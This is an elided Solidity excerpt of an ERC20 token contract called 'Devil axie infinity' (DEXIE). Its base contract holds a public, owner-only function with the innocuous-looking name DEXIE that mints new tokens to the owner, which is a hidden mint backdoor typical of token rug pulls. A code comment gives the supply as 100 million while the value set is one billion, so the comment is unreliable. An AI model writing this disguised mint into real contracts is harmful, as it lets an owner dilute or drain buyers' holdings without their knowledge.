...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function DEXIE(uint256 amount) public onlyOwner {
    _DEXIE(msg.sender, amount);
    }
    ...
    function _DEXIE(address account, uint256 amount) internal virtual {
...
contract DEXIE is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Devil axie infinity", "DEXIE") {
        _DEXIE(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}